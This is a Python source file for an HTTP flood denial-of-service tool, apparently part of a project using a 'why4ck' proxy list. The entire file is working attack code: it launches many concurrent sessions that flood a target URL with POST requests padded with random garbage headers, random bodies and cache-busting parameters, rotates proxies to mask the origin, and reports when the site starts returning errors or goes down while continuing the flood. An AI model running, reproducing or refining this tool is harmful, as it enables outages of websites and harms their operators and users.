import asyncio
import aiohttp
import time
import random
import uuid
import string
import os
from colorama import init, Fore, Style

# Initialize colorama for Windows
init(autoreset=True)


# ============= CONFIGURATION =============
PAYLOAD_SIZE_KB = 1  # Size of random body payload in KB (уменьшено с 10KB - слишком много для большинства серверов)
EXTRA_HEADERS_MIN = 5  # Minimum extra random headers (уменьшено с 20)
EXTRA_HEADERS_MAX = 10  # Maximum extra random headers (уменьшено с 35)
CHARS = string.ascii_letters + string.digits + string.punctuation + ' '
CHARS_NO_NEWLINE = string.ascii_letters + string.digits + string.punctuation + ' _-=+.'  # No newlines for headers


# ============= PROXY LOADING =============
def load_proxies(proxy_file: str = "why4ck/proxy.txt") -> list:
    """Load proxies from file. Returns list of proxy URLs."""
    proxies = []
    try:
        if os.path.exists(proxy_file):
            with open(proxy_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # Support formats: ip:port, http://ip:port, socks5://ip:port
                        if not line.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
                            # Assume it's ip:port, try both HTTP and SOCKS5
                            proxies.append(f"http://{line}")
                        else:
                            proxies.append(line)
        if proxies:
            print(f"{Fore.GREEN}Loaded {len(proxies)} proxies{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}No proxies loaded, using direct connection{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Error loading proxies: {e}{Style.RESET_ALL}")
    return proxies


# ============= RANDOM DATA GENERATION =============
def generate_random_string(length: int) -> str:
    """Generate random string of specified length."""
    return ''.join(random.choices(CHARS, k=length))


def generate_garbage_headers() -> dict:
    """Generate headers with random garbage - adds 2-5KB per request."""
    # Base headers
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ]),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": random.choice([
            "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
            "en-US,en;q=0.9", "en-GB,en;q=0.9",
            "de-DE,de;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8",
        ]),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
        "Sec-Fetch-User": "?1",
        "Priority": "u=0, i",
    }
    
    # Add random garbage headers (reduced size, no newlines)
    num_extra = random.randint(EXTRA_HEADERS_MIN, EXTRA_HEADERS_MAX)
    for i in range(num_extra):
        key = f"X-Random-{i}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}"
        # Use CHARS_NO_NEWLINE for headers to avoid HTTP protocol errors
        value = ''.join(random.choices(CHARS_NO_NEWLINE, k=random.randint(20, 50)))
        headers[key] = value
    
    return headers


def generate_garbage_string(length: int) -> str:
    """Generate garbage string of specified length."""
    return ''.join(random.choices(CHARS, k=length))


def generate_payload(size_kb: int = PAYLOAD_SIZE_KB) -> bytes:
    """Generate random payload body of specified size in KB."""
    return generate_garbage_string(size_kb * 1024).encode('utf-8')


# ============= PRE-GENERATED DATA FOR SPEED =============
_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
]

# Pre-generate base headers (without garbage for speed)
_BASE_HEADERS = [
    {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": random.choice(["ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7", "en-US,en;q=0.9"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    for ua in _USER_AGENTS
]

# Pre-generate garbage header values
_GARBAGE_KEYS = [f"X-Random-{i}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}" 
                 for i in range(50)]
_GARBAGE_VALUES = [generate_garbage_string(random.randint(80, 250)) for _ in range(200)]

# Pre-generate payloads
_PRE_GENERATED_PAYLOADS = [generate_payload(PAYLOAD_SIZE_KB) for _ in range(100)]


# ============= OPTIMIZED FUNCTIONS =============
def get_random_headers() -> dict:
    """Get optimized random headers with garbage data."""
    # Start with base headers
    headers = _BASE_HEADERS[random.randint(0, len(_BASE_HEADERS) - 1)].copy()
    
    # Add random garbage headers
    num_extra = random.randint(EXTRA_HEADERS_MIN, EXTRA_HEADERS_MAX)
    for i in range(num_extra):
        key = _GARBAGE_KEYS[random.randint(0, len(_GARBAGE_KEYS) - 1)]
        value = _GARBAGE_VALUES[random.randint(0, len(_GARBAGE_VALUES) - 1)]
        headers[key] = value
    
    return headers


def get_random_payload(size_kb: int = None) -> bytes:
    """Get pre-generated random payload or generate custom size."""
    if size_kb is None or size_kb == PAYLOAD_SIZE_KB:
        return _PRE_GENERATED_PAYLOADS[random.randint(0, len(_PRE_GENERATED_PAYLOADS) - 1)]
    # Generate custom size payload
    return generate_payload(size_kb)


def get_random_params(base_url: str) -> str:
    """Generate URL with random params."""
    if "?" in base_url:
        separator = "&"
    else:
        separator = "?"
    
    params = [
        f"t={int(time.time() * 1000)}",
        f"id={random.randint(1000, 999999)}",
        f"uid={uuid.uuid4().hex[:8]}",
        f"r={random.randint(1, 999)}",
    ]
    
    if random.random() > 0.5:
        params.append(f"sess={uuid.uuid4().hex}")
    
    return f"{base_url}{separator}{'&'.join(params)}"


def get_request_weight(headers: dict, url: str, payload: bytes = None) -> int:
    """Calculate exact request weight in bytes."""
    weight = 0
    
    # HTTP method line
    path = url.split('://', 1)[1] if '://' in url else url
    if '?' in path:
        path = path.split('?')[0]
    weight += len(path) + 10  # "GET /path HTTP/1.1"
    
    # Headers
    for key, value in headers.items():
        weight += len(key) + len(value) + 4  # "Key: Value\r\n"
    
    # Payload body
    if payload:
        weight += len(payload)
    
    # Final CRLF
    weight += 2
    
    return weight


# ============= OPTIMIZED SESSION RUNNER =============
class OptimizedSession:
    """Optimized session with better memory management."""
    
    def __init__(self, session_id: int, url: str, concurrency: int, is_inf: bool,
                 use_post: bool, use_random_headers: bool, use_random_params: bool,
                 stats: dict, lock: asyncio.Lock, proxies: list = None, payload_size_kb: int = 1):
        self.session_id = session_id
        self.url = url
        self.concurrency = concurrency
        self.is_inf = is_inf
        self.use_post = use_post
        self.use_random_headers = use_random_headers
        self.use_random_params = use_random_params
        self.stats = stats
        self.lock = lock
        self.proxies = proxies or []
        self.payload_size_kb = payload_size_kb
        self._last_output_time = 0
        self._request_weights = []
    
    def _get_proxy(self) -> str:
        """Get random proxy or None."""
        if self.proxies:
            return random.choice(self.proxies)
        return None
    
    async def run(self, requests_limit: int, stop_event: asyncio.Event):
        """Run optimized session."""
        
        # Create optimized connector with SSL disabled (for testing)
        connector = aiohttp.TCPConnector(
            limit=self.concurrency,
            limit_per_host=self.concurrency * 2,
            ttl_dns_cache=300,
            force_close=False,
            enable_cleanup_closed=True,
            keepalive_timeout=30,
            ssl=False,  # Disable SSL verification
        )
        
        timeout = aiohttp.ClientTimeout(total=15, connect=10)
        
        # Use proxy if available
        proxy = self._get_proxy()
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout, 
                                               trust_env=True) as session:
            async with self.lock:
                self.stats['sessions_started'] += 1
            
            batch_num = 0
            while not stop_event.is_set() and not self.stats.get('shutdown', False):
                if not self.is_inf and requests_limit > 0 and self.stats['total'] >= requests_limit:
                    break
                
                remaining = requests_limit - self.stats['total'] if requests_limit > 0 else self.concurrency
                batch_size = min(self.concurrency, remaining)
                
                if batch_size <= 0:
                    break
                
                # Pre-generate all data for this batch
                batch_headers = [get_random_headers() for _ in range(batch_size)]
                batch_payloads = [get_random_payload(self.payload_size_kb) for _ in range(batch_size)]
                
                # Create all tasks
                tasks = []
                for i in range(batch_size):
                    headers = batch_headers[i]
                    payload = batch_payloads[i]
                    target_url = get_random_params(self.url) if self.use_random_params else self.url
                    weight = get_request_weight(headers, target_url, payload)
                    tasks.append(self._make_request(session, target_url, headers, payload, weight, proxy))
                
                # Execute batch
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Process results
                batch_errors = 0
                batch_bytes = 0
                batch_weight_total = 0
                batch_server_errors = 0  # Track 5xx errors
                
                for i, result in enumerate(results):
                    if isinstance(result, Exception):
                        batch_errors += 1
                        batch_bytes += 20000  # Approximate size on error
                    elif result is None:
                        batch_errors += 1
                        batch_bytes += 20000
                    else:
                        status, size, weight = result
                        batch_bytes += size
                        batch_weight_total += weight
                        if status is None:
                            batch_errors += 1
                        # Detect 5xx server errors (503, 504, etc.)
                        elif status >= 500:
                            batch_server_errors += 1
                
                # Track consecutive errors
                if batch_errors == batch_size:
                    async with self.lock:
                        self.stats['consecutive_timeouts'] += 1
                else:
                    async with self.lock:
                        self.stats['consecutive_timeouts'] = 0
                
                # Detect server errors (5xx) - site is struggling
                if batch_server_errors > 0:
                    async with self.lock:
                        if 'server_errors' not in self.stats:
                            self.stats['server_errors'] = 0
                        self.stats['server_errors'] += batch_server_errors
                        
                        # Print warning if we see 5xx errors
                        server_err_count = self.stats['server_errors']
                        if server_err_count >= 3 and not self.stats.get('server_error_msg_printed', False):
                            self.stats['server_error_msg_printed'] = True
                            print(f"\n{Fore.RED}⚠️  WARNING: Server returning 5xx errors ({server_err_count} total) - SERVER STRUGGLING!{Style.RESET_ALL}")
                        elif server_err_count > 0 and server_err_count % 50 == 0:
                            print(f"\n{Fore.RED}⚠️  Server errors count: {server_err_count}{Style.RESET_ALL}")
                
                # Update stats
                async with self.lock:
                    self.stats['total'] += batch_size
                    self.stats['errors'] += batch_errors
                    self.stats['batches'] += 1
                    self.stats['bytes_received'] += batch_bytes
                    
                    if batch_weight_total > 0:
                        self.stats['last_batch_weight'] = batch_weight_total // batch_size
                    
                    if self.stats['consecutive_timeouts'] >= 5 and not self.stats.get('site_down_msg_printed', False):
                        self.stats['site_down'] = True
                        self.stats['site_down_msg_printed'] = True
                        print(f"\n{Fore.RED}⚠️  Session {self.session_id}: SITE MAY BE DOWN - CONTINUING{Style.RESET_ALL}")
                    
                    # Output stats every 0.3 seconds
                    current_time = time.time()
                    if current_time - self._last_output_time >= 0.3:
                        self._last_output_time = current_time
                        self._print_stats()
                
                batch_num += 1
            
            async with self.lock:
                self.stats['sessions_done'] += 1
    
    async def _make_request(self, session: aiohttp.ClientSession, 
                           url: str, headers: dict, payload: bytes, weight: int, proxy: str = None):
        """Make a single optimized request with retry logic and debug logging."""
        max_retries = 2
        last_error = None
        
        for attempt in range(max_retries):
            try:
                if self.use_post:
                    async with session.post(url, data=payload, headers=headers, proxy=proxy, 
                                            ssl=False, allow_redirects=False) as response:
                        content = await response.read()
                        return response.status, len(content), weight
                else:
                    async with session.get(url, headers=headers, proxy=proxy, 
                                           ssl=False, allow_redirects=False) as response:
                        content = await response.read()
                        return response.status, len(content), weight
            except asyncio.TimeoutError:
                last_error = "TIMEOUT"
                if attempt < max_retries - 1:
                    await asyncio.sleep(0.1)
            except aiohttp.ClientSSLError as e:
                last_error = f"SSL_ERROR: {str(e)[:50]}"
                break
            except aiohttp.ClientConnectorError as e:
                last_error = f"CONNECT_ERROR: {str(e)[:50]}"
                if attempt < max_retries - 1:
                    await asyncio.sleep(0.2)
            except aiohttp.ClientError as e:
                last_error = f"CLIENT_ERROR: {str(e)[:50]}"
                if attempt < max_retries - 1:
                    await asyncio.sleep(0.1)
            except Exception as e:
                last_error = f"ERROR: {type(e).__name__}: {str(e)[:30]}"
                break
        
        # Log errors for debugging
        total_so_far = self.stats.get('total', 0)
        if last_error and (total_so_far < 10 or self.stats.get('errors', 0) % 100 == 0):
            print(f"{Fore.RED}[DEBUG Session {self.session_id}] Error: {last_error} | Size: {weight} bytes | URL: {url[:40]}...{Style.RESET_ALL}")
        
        return None, weight, weight  # Use actual weight on error
    
    def _print_stats(self):
        """Print current session stats - or global stats if in multi-session mode."""
        # Check if we're in multi-session mode (sessions > 1)
        is_multi_session = self.stats.get('_is_multi_session', False)
        
        # In multi-session mode, only session 1 prints to avoid duplicate lines
        if is_multi_session and self.session_id != 1:
            return
        
        if is_multi_session:
            # Print global combined stats
            total = self.stats['total']
            errors = self.stats['errors']
            elapsed = time.time() - self.stats['start_time']
            rps = total / elapsed if elapsed > 0 else 0
            
            bytes_received = self.stats['bytes_received']
            mbps = (bytes_received * 8) / (elapsed * 1_000_000) if elapsed > 0 else 0
            
            last_weight = self.stats.get('last_batch_weight', 0)
            active_sessions = self.stats.get('_active_sessions', 1)
            
            print(
                f"{Fore.RED}{total}{Style.RESET_ALL} requests | "
                f"{Fore.BLUE}{rps:.1f}{Style.RESET_ALL} req/s | "
                f"{Fore.CYAN}{last_weight}{Style.RESET_ALL} bytes | "
                f"{Fore.GREEN}{mbps:.1f}{Style.RESET_ALL} Mbps | "
                f"{Fore.MAGENTA}Errors: {errors}{Style.RESET_ALL} | "
                f"{Fore.YELLOW}Sessions: {active_sessions}{Style.RESET_ALL}"
            )
        else:
            # Single session mode - print own stats
            total = self.stats['total']
            errors = self.stats['errors']
            elapsed = time.time() - self.stats['start_time']
            rps = total / elapsed if elapsed > 0 else 0
            
            bytes_received = self.stats['bytes_received']
            mbps = (bytes_received * 8) / (elapsed * 1_000_000) if elapsed > 0 else 0
            
            last_weight = self.stats.get('last_batch_weight', 0)
            
            print(
                f"{Fore.RED}{total}{Style.RESET_ALL} requests | "
                f"{Fore.BLUE}{rps:.1f}{Style.RESET_ALL} req/s | "
                f"{Fore.CYAN}{last_weight}{Style.RESET_ALL} bytes | "
                f"{Fore.GREEN}{mbps:.1f}{Style.RESET_ALL} Mbps | "
                f"{Fore.MAGENTA}Errors: {errors}{Style.RESET_ALL}"
            )


# ============= MAIN OPTIMIZED FUNCTION =============
async def run_optimized_attack(
    url: str,
    sessions: int = 10,
    concurrency: int = 200,
    requests_limit: int = 0,
    is_inf: bool = True,
    use_random_headers: bool = True,
    use_random_params: bool = True,
    use_post: bool = True,  # Changed to True for payload
    show_header: bool = True,
    proxy_file: str = "why4ck/proxy.txt",
    payload_size_kb: int = 1  # Custom payload size from --size flag
):
    """Run optimized multi-session attack with better stability."""
    
    # Override global payload size if custom size provided
    actual_payload_size = payload_size_kb if payload_size_kb > 0 else PAYLOAD_SIZE_KB
    
    # Load proxies
    proxies = load_proxies(proxy_file)
    
    if show_header:
        print(f"\n{Fore.CYAN}{'=' * 60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'OPTIMIZED MULTI-SESSION ATTACK':^60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'=' * 60}{Style.RESET_ALL}\n")
    
    print(f"{Fore.BLUE}Target:{Style.RESET_ALL} {url}")
    print(f"{Fore.YELLOW}Sessions:{Style.RESET_ALL} {sessions}")
    print(f"{Fore.YELLOW}Concurrency per session:{Style.RESET_ALL} {concurrency}")
    print(f"{Fore.YELLOW}Total potential concurrency:{Style.RESET_ALL} {sessions * concurrency}")
    print(f"{Fore.YELLOW}Payload size:{Style.RESET_ALL} {actual_payload_size} KB")
    print(f"{Fore.YELLOW}Extra headers:{Style.RESET_ALL} {EXTRA_HEADERS_MIN}-{EXTRA_HEADERS_MAX} per request")
    print(f"{Fore.GREEN}Mode:{Style.RESET_ALL} {'INFINITE' if is_inf else 'LIMITED'}")
    print(f"{Fore.CYAN}Optimization:{Style.RESET_ALL} Pre-generated headers, DNS cache, Keep-alive")
    print(f"{Fore.YELLOW}Press Ctrl+C to stop\n{Style.RESET_ALL}")
    
    # Shared stats
    stats = {
        'total': 0,
        'errors': 0,
        'batches': 0,
        'sessions_done': 0,
        'sessions_started': 0,
        'consecutive_timeouts': 0,
        'last_rps': 0,
        'site_down': False,
        'site_down_msg_printed': False,
        'bytes_received': 0,
        'start_time': time.time(),
        'shutdown': False,
        'last_batch_weight': 0,
        '_is_multi_session': sessions > 1,  # Flag for multi-session mode
        '_active_sessions': sessions,
    }
    
    lock = asyncio.Lock()
    stop_event = asyncio.Event()
    
    # Create sessions
    session_tasks = []
    for i in range(sessions):
        session = OptimizedSession(
            session_id=i + 1,
            url=url,
            concurrency=concurrency,
            is_inf=is_inf,
            use_post=use_post,
            use_random_headers=use_random_headers,
            use_random_params=use_random_params,
            stats=stats,
            lock=lock,
            proxies=proxies,
            payload_size_kb=actual_payload_size
        )
        task = asyncio.create_task(session.run(requests_limit, stop_event))
        session_tasks.append(task)
    
    await asyncio.sleep(0.1)
    
    try:
        await asyncio.gather(*session_tasks, return_exceptions=True)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Stopping...{Style.RESET_ALL}")
        stop_event.set()
        await asyncio.sleep(0.5)
    finally:
        stop_event.set()
    
    # Calculate final stats
    elapsed = time.time() - stats['start_time']
    total_requests = stats['total']
    total_errors = stats['errors']
    total_bytes = stats['bytes_received']
    
    avg_rps = total_requests / elapsed if elapsed > 0 else 0
    mbps = (total_bytes * 8) / (elapsed * 1_000_000) if elapsed > 0 else 0
    avg_weight = total_bytes // total_requests if total_requests > 0 else 0
    
    # Print summary
    print("\n")
    print(f"{Fore.CYAN}{'=' * 60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'ATTACK SUMMARY':^60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'=' * 60}{Style.RESET_ALL}\n")
    
    print(f"{Fore.CYAN}Sessions Completed:{Style.RESET_ALL} {stats['sessions_done']}/{sessions}")
    print(f"{Fore.RED}Total Requests:{Style.RESET_ALL} {total_requests:,}")
    print(f"{Fore.YELLOW}Errors:{Style.RESET_ALL} {total_errors:,}")
    print(f"{Fore.GREEN}Success Rate:{Style.RESET_ALL} {((total_requests - total_errors) / total_requests * 100) if total_requests > 0 else 0:.1f}%")
    print(f"{Fore.CYAN}Average Request Weight:{Style.RESET_ALL} {avg_weight} bytes (~{avg_weight/1024:.1f} KB)")
    print(f"{Fore.GREEN}Average Speed:{Style.RESET_ALL} {mbps:.2f} Mbit/s")
    print(f"{Fore.BLUE}Average RPS:{Style.RESET_ALL} {avg_rps:.1f} req/s")
    print(f"{Fore.MAGENTA}Total Time:{Style.RESET_ALL} {elapsed:.1f}s")
    
    if stats.get('site_down', False):
        print(f"{Fore.RED}SITE STATUS: DOWN{Style.RESET_ALL}")
    
    return {
        'total': total_requests,
        'errors': total_errors,
        'bytes': total_bytes,
        'elapsed': elapsed,
        'avg_weight': avg_weight,
        'mbps': mbps,
        'avg_rps': avg_rps,
        'sessions': stats['sessions_done'],
        'site_down': stats.get('site_down', False)
    }


# Alias for compatibility
async def ultra_main(url: str, sessions: int = 10, concurrency: int = 200, 
                     is_inf: bool = True, show_header: bool = True, proxy_file: str = "why4ck/proxy.txt"):
    """Compatibility wrapper."""
    await run_optimized_attack(
        url=url,
        sessions=sessions,
        concurrency=concurrency,
        is_inf=is_inf,
        show_header=show_header,
        proxy_file=proxy_file
    )


def use(sessions: int, url: str, concurrency: int = 200, is_inf: bool = True):
    """Sync wrapper for CLI."""
    import asyncio
    asyncio.run(ultra_main(url=url, sessions=sessions, concurrency=concurrency, is_inf=is_inf))
